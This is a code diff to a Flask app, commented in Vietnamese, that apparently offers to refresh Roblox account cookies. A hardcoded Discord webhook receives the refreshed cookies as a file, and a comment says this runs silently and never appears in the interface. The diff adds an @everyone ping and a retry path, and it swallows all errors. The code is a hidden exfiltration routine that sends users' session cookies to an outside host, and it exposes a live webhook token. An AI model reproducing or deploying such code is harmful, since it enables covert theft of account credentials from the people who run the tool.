@@ -14,6 +14,7 @@ app = Flask(__name__)
 
 # Cấu hình Discord Webhook trực tiếp tại đây (chạy ngầm, không xuất ra UI)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1575353201798946956/X3229l9zhS-BASB2LcwtO5dN76HF8b2U6nCXcEFAFOWpKqTAkcXdUgLWQlSu3Z_inKmS"
+PING_EVERYONE = True
 
 LOGOUT_URL = "https://auth.roblox.com/v2/logout"
 TICKET_URL = "https://auth.roblox.com/v1/authentication-ticket"
@@ -85,14 +86,32 @@ def send_refreshed_to_webhook_silent(content: str, ok_count: int, total_count: i
 
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     filename = f"output_refreshed_{ts}.txt"
+    ping_prefix = "@everyone " if PING_EVERYONE else ""
+    mentions = {"parse": ["everyone"]} if PING_EVERYONE else {"parse": []}
     payload = {
-        "content": f"Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công."
+        "content": f"{ping_prefix}Refresh cookie hoàn tất: **{ok_count}/{total_count}** acc thành công.",
+        "allowed_mentions": mentions,
     }
     files = {
-        "file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
+        "files[0]": (filename, io.BytesIO(content.encode("utf-8")), "text/plain; charset=utf-8")
     }
     try:
-        requests.post(url, data={"payload_json": json.dumps(payload)}, files=files, timeout=20)
+        resp = requests.post(
+            url,
+            data={"payload_json": json.dumps(payload, ensure_ascii=False)},
+            files=files,
+            timeout=20,
+        )
+        if resp.status_code not in (200, 204):
+            requests.post(
+                url,
+                data={
+                    "content": payload["content"],
+                    "allowed_mentions": json.dumps(mentions),
+                },
+                files={"file": (filename, io.BytesIO(content.encode("utf-8")), "text/plain")},
+                timeout=20,
+            )
     except Exception:
         pass
 
